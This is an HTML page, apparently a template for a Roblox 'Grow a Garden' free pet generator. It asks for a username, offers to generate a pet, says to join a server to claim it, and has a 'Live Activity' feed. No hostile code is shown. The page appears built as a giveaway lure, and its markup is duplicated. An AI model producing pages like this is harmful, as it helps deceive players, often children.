<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Grow a Garden Pet Generator</title>
  <link rel="stylesheet" href="style.css">
</head>
<body>
  <main>
    <h1>Grow a Garden Pet Generator</h1>

    <!-- Username Input -->
    <section class="card-box input-box">
      <h2>Enter Username</h2>
      <input type="text" id="username" placeholder="Enter Roblox Username">
      <button onclick="startGenerator()">Search</button>
      <div id="profile"></div>
    </section>
    
<div class="search-box">
  <input type="text" id="username" placeholder="Enter Roblox Username">
  <button onclick="submitUsername()">Search</button>
</div>
<p id="user-status"></p>

<div class="generator" style="display:none;">
  <button onclick="generatePet()">Generate Pet</button>
  <div id="pet-result"></div>
  <div id="join-section" style="display:none; margin-top:15px;">
    <p>⬇️ Join server below to claim your pet ⬇️</p>
    <a href="https://roblox.com" target="_blank" class="join-btn">Join</a>
  </div>
</div>

    <!-- Generator -->
    <section id="generator-section" style="display:none;">
      <button onclick="generatePet()">🎲 Generate Pet</button>
      <div id="result"></div>
      <a id="join-btn" href="https://roblox.com" target="_blank" style="display:none;">⬇️ Join Private Server</a>
    </section>

    <!-- Live Activity -->
    <section class="card-box live-box">
      <h2>🌍 Live Activity</h2>
      <div id="activity-feed"></div>
    </section>
  </main>

  <script src="app.js"></script>
</body>
</html>
